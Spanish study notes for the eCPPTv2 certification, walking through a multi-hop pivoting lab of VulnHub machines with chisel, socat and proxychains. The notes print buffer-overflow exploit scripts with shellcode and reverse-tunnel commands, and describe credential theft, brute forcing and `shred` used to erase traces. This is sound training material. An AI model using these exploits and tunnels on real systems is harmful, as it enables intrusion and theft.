
---

El **pivoting** (también conocido como "hopping") es una técnica utilizada en pruebas de penetración y en el análisis de redes que implica el uso de una máquina comprometida para atacar otras máquinas o redes en el mismo entorno.

Por ejemplo, si un atacante ha comprometido una máquina en una red corporativa, puede utilizar técnicas de pivoting para usarla como punto de salto para atacar otras máquinas en la misma red que de otra manera no serían accesibles. Esto se logra a través de la creación de túneles de comunicación desde la máquina comprometida hacia otras máquinas en la red.

El pivoting puede ser utilizado para superar restricciones de seguridad que de otra manera impedirían a un atacante acceder a determinadas máquinas o redes. Por ejemplo, si una red corporativa utiliza segmentación de red para separar diferentes partes de la misma, el pivoting puede ser utilizado para superar esta restricción y permitir que un atacante salte de una red a otra.

En esta clase, veremos cómo desplegar un laboratorio práctico con diferentes máquinas conectadas a través de distintas redes internas, con el objetivo de practicar el concepto de pivoting. Esta clase es crucial para aprobar la certificación del **eCPPTv2**, pues se te presentará un laboratorio muy similar.

Aprovecharemos la ocasión para explicar varios TIPS, así como cosas a tener en cuenta de cara al examen. Veremos cómo representar la información de las máquinas comprometidas y las conexiones que estas tienen con otras máquinas a través de las redes internas configuradas, haciendo uso de Obsidian.

---

## Máquinas

Lo primero será descargar todas las máquinas virtuales.

- [HarryPotter: Nagini](https://www.vulnhub.com/entry/harrypotter-nagini,689/)
- [Matrix: 1](https://www.vulnhub.com/entry/matrix-1,259/)
- [HarryPotter: Fawkes](https://www.vulnhub.com/entry/harrypotter-fawkes,686/)
- [Brainpan: 1](https://www.vulnhub.com/entry/brainpan-1,51/)
- [HarryPotter: Aragog (1.0.2)](https://www.vulnhub.com/entry/harrypotter-aragog-102,688/)

---

## Red Interna — Simulación eCPPT v2

![Red Interna|800](IMG/Pasted%20image%2020260602182604.png)

---

## Segmentación de red

**Comandos para crear todas las redes host-only:**

```bash
# vboxnet0 (ya existía, 192.168.56.0/24)

# vboxnet1 — 10.10.0.0/24
VBoxManage hostonlyif create
sudo ip link set vboxnet1 up
sudo ip addr add 10.10.0.1/24 dev vboxnet1
VBoxManage dhcpserver add --ifname vboxnet1 --ip 10.10.0.100 --netmask 255.255.255.0 --lowerip 10.10.0.101 --upperip 10.10.0.200 --enable

# vboxnet2 — 192.168.100.0/24
VBoxManage hostonlyif create
sudo ip link set vboxnet2 up
sudo ip addr add 192.168.100.1/24 dev vboxnet2
VBoxManage dhcpserver add --ifname vboxnet2 --ip 192.168.100.100 --netmask 255.255.255.0 --lowerip 192.168.100.101 --upperip 192.168.100.200 --enable

# vboxnet3 — 172.18.0.0/24
VBoxManage hostonlyif create
sudo ip link set vboxnet3 up
sudo ip addr add 172.18.0.1/24 dev vboxnet3
VBoxManage dhcpserver add --ifname vboxnet3 --ip 172.18.0.100 --netmask 255.255.255.0 --lowerip 172.18.0.101 --upperip 172.18.0.200 --enable

# vboxnet4 — 10.15.12.0/24
VBoxManage hostonlyif create
sudo ip link set vboxnet4 up
sudo ip addr add 10.15.12.1/24 dev vboxnet4
VBoxManage dhcpserver add --ifname vboxnet4 --ip 10.15.12.100 --netmask 255.255.255.0 --lowerip 10.15.12.101 --upperip 10.15.12.200 --enable
```

---

## Configurar interfaces al entrar a la máquina

Manteniendo **e** al iniciar la máquina, deberemos entrar como root y en el archivo `/etc/network/interfaces` poner la siguiente configuración:

```bash
auto enp0s3
allow-hotplug enp0s3
iface enp0s3 inet dhcp

auto enp0s8
allow-hotplug enp0s8
iface enp0s8 inet dhcp
```

---

## Primera máquina: Aragog

Lo primero es comprobar que tenemos conexión.

![Conexion|800](IMG/Pasted%20image%2020260602191927.png)

Como podemos ver nos enfrentamos a una máquina Linux. A continuación lanzamos un nmap para ver qué puertos están abiertos.

![Nmap|800](IMG/Pasted%20image%2020260602192015.png)

Lanzamos otro nmap para lanzar algunos scripts básicos y enumerar versiones.

![Nmap scripts|800](IMG/Pasted%20image%2020260602192048.png)

Whatweb para encontrar tecnologías de la web.

![Whatweb|800](IMG/Pasted%20image%2020260602193543.png)

Accedemos y podemos ver una imagen.

![Web|800](IMG/Pasted%20image%2020260602193604.png)

Usamos gobuster para enumeración de directorios.

![Gobuster|800](IMG/Pasted%20image%2020260602194010.png)

En `/blog` hemos encontrado un host virtual. Por tanto lo añadimos al `/etc/hosts`.

![Hosts|800](IMG/Pasted%20image%2020260602194139.png)

Lanzamos _wpscan_ en busca de posibles usuarios o plugins vulnerables.

![Wpscan|800](IMG/Pasted%20image%2020260602194737.png)

Con `--plugins-detection aggressive` puede detectar plugins que no había detectado antes.

![Wpscan aggressive|800](IMG/Pasted%20image%2020260602195028.png)

Esta vez nos reporta esta vulnerabilidad en uno de los plugins que parece interesante.

![Vulnerabilidad|800](IMG/Pasted%20image%2020260602195522.png)

Nos bajamos el script y creamos el archivo `payload.php`, que es lo único que requiere para que funcione.

![Payload|800](IMG/Pasted%20image%2020260602195750.png)

Lanzamos el script y vamos a la URL para comprobar si funciona. (**¡Mucho ojo con la URL porque hay dos `/blog`!**)

![Script|800](IMG/Pasted%20image%2020260602195847.png)

Como podemos ver, podemos ejecutar comandos.

![RCE|800](IMG/Pasted%20image%2020260602195936.png)

Con este oneliner típico obtenemos una shell.

![Shell|800](IMG/Pasted%20image%2020260602200233.png)

Y estamos dentro.

![Dentro|800](IMG/Pasted%20image%2020260602200312.png)

Con `shred` podemos borrar un archivo dejando las menores pruebas posibles de que ha estado ahí. Cuantas más veces se lo indiques, más difícil es de recuperar.

![Shred|800](IMG/Pasted%20image%2020260602200554.png)

A continuación podemos buscar posibles datos filtrados de la base de datos en el `wordpress.conf`. Para encontrarlo ejecutamos el siguiente comando.

![Busqueda|800](IMG/Pasted%20image%2020260602200937.png)

Abriendo uno de los archivos encontramos la ruta del `wp-config.php`.

![wp-config|800](IMG/Pasted%20image%2020260602201108.png)

En este archivo no encontramos contraseñas, pero puede que estén en el archivo que se está llamando, debido a que es la configuración por defecto.

![Config|800](IMG/Pasted%20image%2020260602201258.png)

Aquí están los usuarios y contraseñas.

![Credenciales|800](IMG/Pasted%20image%2020260602201333.png)

Accedemos a la base de datos.

![DB|800](IMG/Pasted%20image%2020260602201416.png)

Seleccionamos la base de datos de WordPress y vemos qué hay.

![WordPress DB|800](IMG/Pasted%20image%2020260602201550.png)

Extraemos todos los datos de `wp_users` para ver qué usuarios hay creados.

![wp_users|800](IMG/Pasted%20image%2020260602201632.png)

Podemos probar a crackear la contraseña.

![Crack|800](IMG/Pasted%20image%2020260602201759.png)

Probamos a loguearnos.

![Login|800](IMG/Pasted%20image%2020260602201852.png)

He estado mirando un rato y no encontraba nada, por tanto he subido linpeas al servidor.

![Linpeas|800](IMG/Pasted%20image%2020260602202524.png)

He encontrado este script que puede ser interesante.

![Script interesante|800](IMG/Pasted%20image%2020260602202951.png)

Este script crea una copia del directorio de uploads a una carpeta que pertenece a root. Por tanto intuimos que quien ejecuta el script es root.

![Script root|800](IMG/Pasted%20image%2020260602203210.png)

Después de 1 minuto podemos ver que sí ha cambiado.

![Cambio|800](IMG/Pasted%20image%2020260602204044.png)

Obtenemos shell como root.

![Root|800](IMG/Pasted%20image%2020260602204326.png)

Una vez como root, podemos ver que hay otra interfaz de red.

![Interfaz|800](IMG/Pasted%20image%2020260602204944.png)

Por tanto vamos a intentar aplicar reconocimiento a esta.

---

## Segunda máquina: Nagini

Lo primero que haremos será crear persistencia generando un par de llaves públicas con `ssh-keygen`.

![ssh-keygen|800](IMG/Pasted%20image%2020260602205236.png)

La añadimos al directorio `.ssh`.

![authorized_keys|800](IMG/Pasted%20image%2020260602205302.png)

De esta manera podremos conectarnos sin tener que proporcionar contraseñas.

![SSH sin password|800](IMG/Pasted%20image%2020260602205350.png)

Para descubrir los hosts podemos crear el siguiente script, que se encarga de aplicar descubrimiento mediante ping. Básicamente enviaremos un ping a toda la red, y la que responda la mostraremos.

![Script ping|800](IMG/Pasted%20image%2020260602205903.png)

Encontramos otra máquina que no es la nuestra.

![Host encontrado|800](IMG/Pasted%20image%2020260602210001.png)

En caso de no aceptar tramas ICMP, lo podemos hacer mandando echos a `/dev/tcp/10.10.0.$i/$puerto`. De esta manera sabremos también qué puertos están abiertos. La manera de funcionar es la misma: si existe nos devuelve 0 (código de estado exitoso), si no, 1.

![Script puertos|800](IMG/Pasted%20image%2020260602210453.png)

Aquí tenemos el resultado de los puertos abiertos.

![Puertos abiertos|800](IMG/Pasted%20image%2020260602220226.png)

Ahora usaremos un túnel SOCKS con [chisel](https://github.com/jpillora/chisel/releases) para, desde nuestro equipo, llegar al segmento de red que no podemos ver directamente.

Lo descargamos, extraemos y le damos permisos de ejecución.

![Chisel descarga|800](IMG/Pasted%20image%2020260602220639.png)

Lo subimos al servidor.

![Chisel subida|800](IMG/Pasted%20image%2020260602220723.png)

En la máquina atacante lo ejecutamos en modo servidor. Lo que hacemos es remote port forwarding: traernos varios puertos.

![Chisel servidor|800](IMG/Pasted%20image%2020260602221016.png)

En la parte de la víctima ejecutaremos chisel en modo cliente, indicando nuestra IP y seguidamente el puerto remoto de nuestra máquina donde queremos ver el puerto que reenviamos.

![Chisel cliente|800](IMG/Pasted%20image%2020260602221514.png)

---

# Chisel - Port Forwarding

Chisel tuneliza puertos a través de HTTP. Útil para acceder a servicios internos de la víctima desde el atacante.

## 1. Atacante — Servidor

Si vamos a enviar el puerto 80 deberemos ejecutarlo con sudo.

```bash
./chisel server -p 1234 --reverse
```

## 2. Víctima — Cliente

```bash
./chisel client <IP_ATACANTE>:1234 R:80:10.10.0.104:80
```

## Sintaxis del reenvío

```
R : PUERTO_ATACANTE : IP_VICTIMA : PUERTO_VICTIMA
```

**"En mi atacante en el puerto 80, quiero ver lo que hay en 10.10.0.104:80"**

Desde el atacante accedes al servicio en `localhost:80`.

---

También podemos usar SOCKS. Esto crea un proxy SOCKS5 en nuestra máquina en lugar de reenviar solo un puerto.

![SOCKS|800](IMG/Pasted%20image%2020260602222509.png)

Para que funcione deberemos editar el archivo `/etc/proxychains.conf`. Descomentaremos `strict_chain` y al final del archivo añadiremos el SOCKS que hemos creado con el puerto correspondiente. **IMPORTANTE: comentar `socks4` si existe.**

![proxychains conf|800](IMG/Pasted%20image%2020260602222826.png)

![proxychains conf 2|800](IMG/Pasted%20image%2020260602222815.png)

Para lanzar un nmap a la IP que desde nuestra máquina atacante no podemos ver pero desde la vulnerada sí, tendremos que usar proxychains con los parámetros `-sT` (TCP connect scan) y `-Pn` (sin host discovery). Veremos mucho output, podemos mandarlo al `/dev/null`.

![Nmap proxychains|800](IMG/Pasted%20image%2020260602223601.png)

Podemos ver qué hay en la página web.

![Web Nagini|800](IMG/Pasted%20image%2020260602224640.png)

Para poder ver la web deberemos crear una opción nueva en nuestro FoxyProxy, indicando el tipo de SOCKS que estamos usando y la IP del proxy.

![FoxyProxy|800](IMG/Pasted%20image%2020260602224825.png)

Y ya podemos ver la página web.

![Web visible|800](IMG/Pasted%20image%2020260602224959.png)

Con gobuster tenemos el parámetro `--proxy`, al que le tenemos que indicar el tipo de SOCKS y dónde se encuentra, de esta manera podremos enumerar.

![Gobuster proxy|800](IMG/Pasted%20image%2020260602225155.png)

De esta manera también nos podemos traer un puerto específico como el 443 con el protocolo UDP, debido a que en el archivo `note.txt` que hemos encontrado dice que se usa HTTP3 en un servidor.

![note.txt|800](IMG/Pasted%20image%2020260602225610.png)

![Puerto 443|800](IMG/Pasted%20image%2020260602225619.png)

Para realizar peticiones de este tipo deberemos instalar la herramienta [quiche](https://github.com/cloudflare/quiche).

![Quiche|800](IMG/Pasted%20image%2020260602231444.png)

Con esta herramienta realizaremos peticiones HTTP3.

![HTTP3|800](IMG/Pasted%20image%2020260602231736.png)

No me ha funcionado, por tanto he seguido la clase para ver si podía avanzar sin esta herramienta.

![Avance|800](IMG/Pasted%20image%2020260602234445.png)

![Avance 2|800](IMG/Pasted%20image%2020260602234520.png)

Como podemos ver, hace una petición por GET a lo que nosotros le indiquemos. Por ejemplo el localhost de la máquina Nagini.

![GET request|800](IMG/Pasted%20image%2020260602234718.png)

![GET response|800](IMG/Pasted%20image%2020260602234907.png)

Podemos probar a cargar un script en PHP desde nuestra máquina. Para que la máquina Nagini pueda ver nuestra IP, deberemos controlar las peticiones; para eso descargaremos [socat](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat) y lo subiremos a Aragog. Lo que le estamos indicando a socat es que todo lo que llegue a nuestra máquina por el puerto 4343 se redirija a la IP y puerto que indicamos, que en este caso es donde tenemos el script en PHP.

![Socat|800](IMG/Pasted%20image%2020260603002505.png)

![Socat 2|800](IMG/Pasted%20image%2020260603002604.png)

Pero tras varias pruebas vemos que no interpreta el PHP.

![PHP no funciona|800](IMG/Pasted%20image%2020260603003035.png)

Antes hemos visto que había un Joomla, vamos a lanzar un joomscan para ver qué hay.

![Joomscan|800](IMG/Pasted%20image%2020260603003356.png)

![Joomscan 2|800](IMG/Pasted%20image%2020260603003305.png)

Hemos encontrado un archivo `.bak`, que puede ser interesante.

![Archivo bak|800](IMG/Pasted%20image%2020260603003639.png)

Lo descargamos.

![Descarga bak|800](IMG/Pasted%20image%2020260603003751.png)

Podemos ver información del usuario de la base de datos.

![DB usuario|800](IMG/Pasted%20image%2020260603004014.png)

He instalado la herramienta gopherus, que nos permite obtener información sobre la base de datos. Solo funciona cuando el usuario no tiene contraseña.

![Gopherus|800](IMG/Pasted%20image%2020260603004516.png)

![Gopherus 2|800](IMG/Pasted%20image%2020260603005243.png)

Obtenemos las tablas.

![Tablas|800](IMG/Pasted%20image%2020260603010632.png)

![Tablas 2|800](IMG/Pasted%20image%2020260603010858.png)

Enumeramos las columnas de `joomla_users`.

![Columnas|800](IMG/Pasted%20image%2020260603011048.png)

![Columnas 2|800](IMG/Pasted%20image%2020260603011032.png)

Obtenemos el nombre, usuario, email y contraseña.

![Datos usuario|800](IMG/Pasted%20image%2020260603011344.png)

![Datos usuario 2|800](IMG/Pasted%20image%2020260603011447.png)

He probado a crackear la contraseña pero después de un rato no lo he conseguido, por tanto he probado a cambiar los valores del usuario `site_admin`.

![Cambio password|800](IMG/Pasted%20image%2020260603011949.png)

![Cambio password 2|800](IMG/Pasted%20image%2020260603012028.png)

Accedemos al panel de administración de Joomla.

![Panel Joomla|800](IMG/Pasted%20image%2020260603012102.png)

Para acceder a la máquina iremos a extensiones, seleccionaremos un template y en cualquiera de los archivos (en este caso `error.php`) añadiremos código. Este se ejecutará cada vez que haya un error.

![Template|800](IMG/Pasted%20image%2020260603012237.png)

Ponemos el código con la shell y tendremos que abrir otro socat para poder redirigir la shell que nos llegue por el puerto 7777 al puerto donde tengamos nuestro listener en la máquina atacante.

![Shell code|800](IMG/Pasted%20image%2020260603012641.png)

![Socat listener|800](IMG/Pasted%20image%2020260603013801.png)

Provocamos el error.

![Error|800](IMG/Pasted%20image%2020260603013733.png)

Y estamos dentro.

![Dentro Nagini|800](IMG/Pasted%20image%2020260603013746.png)

Aquí tenemos otra IP.

![Nueva IP|800](IMG/Pasted%20image%2020260603013853.png)

Entramos al home y encontramos las credenciales de snape.

![Credenciales snape|800](IMG/Pasted%20image%2020260603104916.png)

En el directorio home del otro usuario encontramos una carpeta con un binario que es el de cp que tiene permisos SUID.

![SUID cp|800](IMG/Pasted%20image%2020260603105542.png)

Como podemos copiar archivos vamos al tmp, y subimos la clave pública de nuestra máquina en un archivo `authorized_keys`.

![authorized_keys|800](IMG/Pasted%20image%2020260603105904.png)

Lo copiamos al `.ssh` del usuario hermoine.

![Copia ssh|800](IMG/Pasted%20image%2020260603111018.png)

Y accedemos por SSH.

![SSH hermoine|800](IMG/Pasted%20image%2020260603110955.png)

En el home de este usuario hay una carpeta de Mozilla con un usuario, en la cual podemos posiblemente encontrar una contraseña en alguno de los archivos.

![Mozilla|800](IMG/Pasted%20image%2020260603111243.png)

En el archivo `logins.json`, encontramos la password encriptada. Que con la herramienta firepwd y el `key4.db`, podremos ver.

![logins.json|800](IMG/Pasted%20image%2020260603111335.png)

Nos transferimos los dos archivos necesarios a nuestra máquina.

![Transferencia|800](IMG/Pasted%20image%2020260603111835.png)

Y ya con la herramienta podemos ver la contraseña. He tenido que meter dentro de una carpeta el login como la key para poder usar la herramienta.

![Firepwd|800](IMG/Pasted%20image%2020260603112931.png)

Iniciamos sesión como root.

![Root Nagini|800](IMG/Pasted%20image%2020260603113020.png)

Creamos persistencia.

![Persistencia|800](IMG/Pasted%20image%2020260603113145.png)

---

## Tercera máquina: Fawkes

Como podemos ver tenemos otra red.

![Nueva red|800](IMG/Pasted%20image%2020260603113359.png)

Con el mismo script de antes. La que acaba en 100 la ignoraremos.

![Script descubrimiento|800](IMG/Pasted%20image%2020260603115145.png)

Lo mismo para los puertos.

![Puertos Fawkes|800](IMG/Pasted%20image%2020260603114207.png)

Por tanto desde esta máquina tenemos acceso a una red que contiene dos máquinas más.

![Red nueva|800](IMG/Pasted%20image%2020260603115805.png)

La primera que atacaremos será la Fawkes que es la máquina Linux.

Lo primero que haremos será subir el socat, para poder redirigir el tráfico hacia nuestra máquina atacante.

![Socat subida|800](IMG/Pasted%20image%2020260603120239.png)

A continuación como cliente en la máquina Nagini, mandaremos con chisel una nueva conexión como cliente al nodo más cercano que sería la máquina Aragog.

![Chisel Nagini|800](IMG/Pasted%20image%2020260603120901.png)

Y con socat redirigiremos esta conexión hacia el servidor de chisel que tenemos en nuestra máquina.

![Socat redireccion|800](IMG/Pasted%20image%2020260603120931.png)

En el archivo `proxychains.conf`, como he dicho antes deberemos activar la opción de `dynamic_chain`, debido a que ahora tenemos múltiples conexiones. Y comentaremos `strict_chain` que es la que teníamos antes cuando solo teníamos una conexión.

![dynamic_chain|800](IMG/Pasted%20image%2020260603121139.png)

Seguidamente al final, arriba del anterior socks5, **SIEMPRE** para poder apuntar hacia nuestro nuevo host, deberemos indicar el socks5 la IP local y el puerto que hemos abierto con esta nueva conexión.

![Nuevo socks5|800](IMG/Pasted%20image%2020260603121406.png)

Como podemos ver llegamos a la máquina si todo está bien.

![Conexion Fawkes|800](IMG/Pasted%20image%2020260603121555.png)

Al tener dos proxychains, empezaremos a jugar con xargs, para poder realizar peticiones más rápidas. Creamos una secuencia del 1 al 65535, y con xargs le indicamos que queremos usar 500 hilos para enviar peticiones por separado a cada puerto.

![xargs puertos|800](IMG/Pasted%20image%2020260603122015.png)

Creamos el nuevo proxy en FoxyProxy con la nueva conexión que hemos abierto.

![FoxyProxy nuevo|800](IMG/Pasted%20image%2020260603122253.png)

Podemos ver la web.

![Web Fawkes|800](IMG/Pasted%20image%2020260603122338.png)

Como hemos visto el puerto 21 está abierto, probamos a conectarnos por FTP de manera anónima. Para poder enumerar y que funcionen bien los comandos debemos introducir el comando `passive`.

![FTP anonimo|800](IMG/Pasted%20image%2020260603122628.png)

![FTP passive|800](IMG/Pasted%20image%2020260603122732.png)

Nos descargamos el archivo que tenemos en FTP.

![Descarga FTP|800](IMG/Pasted%20image%2020260603122818.png)

Podemos ver que es un binario de 32 bits y que al ejecutarlo no podemos ver mucho, por tanto vamos a intentar averiguar qué hace.

![Binario|800](IMG/Pasted%20image%2020260603123206.png)

Como podemos ver está montando un puerto por el servidor 9898.

![Puerto 9898|800](IMG/Pasted%20image%2020260603123337.png)

Nos conectamos.

![Conexion 9898|800](IMG/Pasted%20image%2020260603123450.png)

Como hemos visto en el nmap este mismo puerto estaba abierto en el servidor así que vamos a probar a conectarnos.

![Nmap 9898|800](IMG/Pasted%20image%2020260603123552.png)

Mirando en el archivo he encontrado esto. Que puede ser una pista así que vamos a probar.

![Pista|800](IMG/Pasted%20image%2020260603123803.png)

Efectivamente tenemos un buffer overflow.

![Buffer overflow|800](IMG/Pasted%20image%2020260603123937.png)

He encontrado esta foto que representa bien lo que deberemos hacer.

![Buffer Overflow Attack|800](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgDMWWaS3Z4BuvIGvwuCy2XffqMxiOkcSiiD-1Q6uyw5sXb7ldsmnH6m0KsrnZYe0PH4WHIZ7sLnPcYa6h_HSPt_G9FnvIn4qMAgKZSQVgELJtFHs2LU7S4XX0-jqVfPjEpZaMrStCrAjpo/s1600/Buffer+Overflow.png)

### Buffer Overflow

Abrimos el programa con gdb y lo arrancamos con el parámetro `r` y llenamos el buffer de A.

![GDB|800](IMG/Pasted%20image%2020260603124246.png)

![GDB crash|800](IMG/Pasted%20image%2020260603124322.png)

Con `checksec`, vemos que NX está desactivada lo que nos permite hacer que el flujo del programa vaya hacia una dirección de la pila que sea un shellcode el cual ejecute un comando.

![checksec|800](IMG/Pasted%20image%2020260603124520.png)

Con `pattern create`, generamos 1024 caracteres, para saber en qué parte se sobrescribe el EIP.

![pattern create|800](IMG/Pasted%20image%2020260603124918.png)

Y vemos que el EIP equivale a 112:

![EIP offset|800](IMG/Pasted%20image%2020260603125554.png)

![EIP offset 2|800](IMG/Pasted%20image%2020260603125751.png)

Por tanto deberemos escribir 112 caracteres antes de sobrescribir el EIP. Así que printaremos 112 letras A, 4 B para el EIP y 100 C para lo demás.

![EIP control|800](IMG/Pasted%20image%2020260603130037.png)

![EIP control 2|800](IMG/Pasted%20image%2020260603130141.png)

Como podemos ver podemos reflejar lo que nosotros queramos en el EIP. Ahora lo que debemos hacer es saltar del EIP al ESP.

Para esto hemos creado el siguiente script para ejecutarlo en local:

```python
#!/bin/python3

import socket

offset = 112
before_eip = b"A" * offset
eip = b"\x55\xd9\x04\x08" # Little endian 8049d55

shellcode = b""
shellcode += b"\xba\x6c\x0c\xd7\xb3\xd9\xc8\xd9\x74\x24\xf4"
shellcode += b"\x5d\x29\xc9\xb1\x12\x83\xed\xfc\x31\x55\x0e"
shellcode += b"\x03\x39\x02\x35\x46\xf0\xc1\x4e\x4a\xa1\xb6"
shellcode += b"\xe3\xe7\x47\xb0\xe5\x48\x21\x0f\x65\x3b\xf4"
shellcode += b"\x3f\x59\xf1\x86\x09\xdf\xf0\xee\x49\xb7\x6c"
shellcode += b"\x84\x21\xca\x72\x49\xee\x43\x93\xd9\x68\x04"
shellcode += b"\x05\x4a\xc6\xa7\x2c\x8d\xe5\x28\x7c\x25\x98"
shellcode += b"\x07\xf2\xdd\x0c\x77\xdb\x7f\xa4\x0e\xc0\x2d"
shellcode += b"\x65\x98\xe6\x61\x82\x57\x68"

after_eip = b"\x90" * 32 + shellcode
payload = before_eip + eip + after_eip

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("localhost", 9898))
s.send(payload)
s.close()
```

Creación del shellcode.

![Shellcode|800](IMG/Pasted%20image%2020260603131111.png)

Encontrar salto al ESP.

![JMP ESP|800](IMG/Pasted%20image%2020260603131825.png)

![JMP ESP 2|800](IMG/Pasted%20image%2020260603131842.png)

Y este sería el script para la máquina:

```python
#!/bin/python3

import socket

offset = 112
before_eip = b"A" * offset
eip = b"\x55\x9d\x04\x08" # Little endian 8049d55

shellcode =  b""
shellcode += b"\xdb\xd8\xd9\x74\x24\xf4\x5f\x31\xc9\xbb\xa0"
shellcode += b"\x5e\x90\xd8\xb1\x12\x31\x5f\x17\x03\x5f\x17"
shellcode += b"\x83\x4f\xa2\x72\x2d\xbe\x80\x84\x2d\x93\x75"
shellcode += b"\x38\xd8\x11\xf3\x5f\xac\x73\xce\x20\x5e\x22"
shellcode += b"\x60\x1f\xac\x54\xc9\x19\xd7\x3c\x0a\x71\x43"
shellcode += b"\xd6\xe2\x80\x8c\x33\x40\x0d\x6d\x8b\xc0\x5e"
shellcode += b"\x3f\xb8\xbf\x5c\x36\xdf\x0d\xe2\x1a\x77\xe0"
shellcode += b"\xcc\xe9\xef\x94\x3d\x21\x8d\x0d\xcb\xde\x03"
shellcode += b"\x9d\x42\xc1\x13\x2a\x98\x82"

after_eip = b"\x90"*32 + shellcode

payload = before_eip + eip + after_eip

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.100.103", 9898))
s.send(payload)
s.close()
```

Nuevo payload con la IP de la máquina más cercana.

![Payload maquina|800](IMG/Pasted%20image%2020260603132915.png)

**MUY IMPORTANTE TENER LOS TÚNELES BIEN HECHOS**, he terminado cambiando el payload porque no me iba y he usado el puerto 4444 al final.

![Tuneles|800](IMG/Pasted%20image%2020260603151052.png)

Para escalar privilegios podemos ejecutar cualquier comando con sudo.

![Sudo|800](IMG/Pasted%20image%2020260603151316.png)

En el home de root encontramos una nota que dice lo siguiente:

![Nota root|800](IMG/Pasted%20image%2020260603151444.png)

Con tcpdump lo que hacemos es escuchar, debido a que cada tanto hay una conexión por FTP y puede que represente algo de información valiosa.

![tcpdump|800](IMG/Pasted%20image%2020260603151849.png)

Obtenemos el usuario neville con su password.

![Credenciales neville|800](IMG/Pasted%20image%2020260603152023.png)

Y con este usuario y password podemos acceder por SSH a esta máquina real, anteriormente estábamos en un contenedor.

![SSH neville|800](IMG/Pasted%20image%2020260603152230.png)

Mirando archivos con privilegios SUID. Encontramos uno muy interesante que es el sudo.

![SUID sudo|800](IMG/Pasted%20image%2020260603152706.png)

Mirando la versión vemos que es vulnerable.

![Version sudo|800](IMG/Pasted%20image%2020260603152742.png)

Para explotarlo usaremos el siguiente script: [Script](https://github.com/worawit/CVE-2021-3156). Importante cambiar la ruta al path de sudo.

![CVE-2021-3156|800](IMG/Pasted%20image%2020260603153126.png)

![Root Fawkes|800](IMG/Pasted%20image%2020260603153147.png)

Ya somos root en la máquina Fawkes.

---

## Cuarta máquina: Dumbledore

Aplicamos el reconocimiento.

![Reconocimiento Dumbledore|800](IMG/Pasted%20image%2020260603154036.png)

Al ver que está el puerto 445 abierto, probamos con crackmapexec a obtener algo de información sobre este puerto.

![crackmapexec|800](IMG/Pasted%20image%2020260603154112.png)

A continuación con la herramienta [autoblue](https://github.com/3ndg4me/autoblue-ms17-010) para automatizar la explotación.

![autoblue|800](IMG/Pasted%20image%2020260603160304.png)

Como podemos ver tenemos una pipe que si ejecutamos el `zzz_exploit.py`, gracias a esta pipe podremos obtener una shell interactiva. Para que este funcionara he debido copiar el repositorio con la herramienta arreglada. [Repo](https://github.com/robsann/AutoBlue-MS17-010-python3-fix)

![zzz_exploit|800](IMG/Pasted%20image%2020260603160658.png)

![Shell Dumbledore|800](IMG/Pasted%20image%2020260603160703.png)

Estamos dentro de la Dumbledore.

Podemos ver que hay otra red.

![Red Dumbledore|800](IMG/Pasted%20image%2020260603160804.png)

Descargamos [netcat](https://eternallybored.org/misc/netcat/) para Windows para poder tener una mejor ejecución de comandos.

![Netcat Windows|800](IMG/Pasted%20image%2020260603161104.png)

![Netcat Windows 2|800](IMG/Pasted%20image%2020260603161237.png)

Compartimos la carpeta donde tenemos netcat, con SMB.

![SMB|800](IMG/Pasted%20image%2020260603161706.png)

Configuramos la redirección hacia nuestra máquina con socat.

![Socat Dumbledore|800](IMG/Pasted%20image%2020260603162158.png)

Y comprobamos si funciona.

![Comprobacion|800](IMG/Pasted%20image%2020260603162149.png)

Copiamos el archivo de netcat.

![Copia netcat|800](IMG/Pasted%20image%2020260603162355.png)

Y nos mandamos la shell. Importante con penelope indicar el puerto con `-p` porque si no usa el 4444.

![Shell penelope|800](IMG/Pasted%20image%2020260603162727.png)

![Shell dentro|800](IMG/Pasted%20image%2020260603162738.png)

---

## Quinta máquina: Matrix 1

Para la enumeración al ser Windows, podemos usar este comando. Seguido de un `arp -a`. Es recomendable antes de esto hacer un `arp -d`.

```powershell
for /l %i in (1,1,254) do @ping -4 -n 1 -w 100 X.X.X.%i | findstr TTL
```

![Ping Windows|800](IMG/Pasted%20image%2020260603174340.png)

Como podemos ver tenemos la IP `172.18.0.102`. Entonces lo que haremos ahora será descargar el chisel para Windows, y subirlo a la máquina para poder ejecutar comandos desde nuestra máquina. Para pasarlo yo lo he hecho con HTTP, porque al tener el puerto ocupado, no he tenido otra que crear dos redirecciones con socat.

![Chisel Windows|800](IMG/Pasted%20image%2020260603181951.png)

![Chisel Windows 2|800](IMG/Pasted%20image%2020260603181922.png)

![Chisel Windows 3|800](IMG/Pasted%20image%2020260603181927.png)

Chisel no me estaba funcionando, por tanto he instalado una versión más antigua. [Versión](https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_windows_amd64.gz)

![Chisel version antigua|800](IMG/Pasted%20image%2020260603182436.png)

Estos serían los socats que hemos utilizado.

![Socats|800](IMG/Pasted%20image%2020260603183526.png)

Y recuerda añadirlo al `/etc/proxychains.conf`.

![proxychains Matrix|800](IMG/Pasted%20image%2020260603183556.png)

Lanzamos un escaneo a los puertos.

![Escaneo Matrix|800](IMG/Pasted%20image%2020260603185540.png)

Según el video en la web no hay nada, por tanto vamos a esperar a ver si sale otro puerto.

![Espera puerto|800](IMG/Pasted%20image%2020260603190109.png)

Encontramos el puerto 31337, que como podemos ver es una página web.

![Puerto 31337|800](IMG/Pasted%20image%2020260603190211.png)

En el código fuente de la página encontramos una cadena en base64.

![Base64|800](IMG/Pasted%20image%2020260603190308.png)

Podemos ver que está guardando esta cadena de texto en este archivo, vamos a ver qué es.

![Archivo base64|800](IMG/Pasted%20image%2020260603190357.png)

Encontramos código en brainfuck.

![Brainfuck|800](IMG/Pasted%20image%2020260603190513.png)

Vamos a decodificarlo.

![Decode brainfuck|800](IMG/Pasted%20image%2020260603190611.png)

![Decode brainfuck 2|800](IMG/Pasted%20image%2020260603190652.png)

Tenemos una contraseña de usuario invitado, pero tenemos que conseguir los dos últimos caracteres. Creamos un diccionario con crunch el cual nos genera una contraseña de no más de 8 caracteres y de un mínimo de 8 caracteres, reemplazando los dos últimos por minúsculas `@` y números `%`.

![Crunch|800](IMG/Pasted%20image%2020260603191120.png)

Lanzamos un hydra al puerto 22 que estaba abierto con el usuario que nos dan y el diccionario de passwords que hemos generado.

![Hydra|800](IMG/Pasted%20image%2020260603191342.png)

Y encontramos la contraseña correcta.

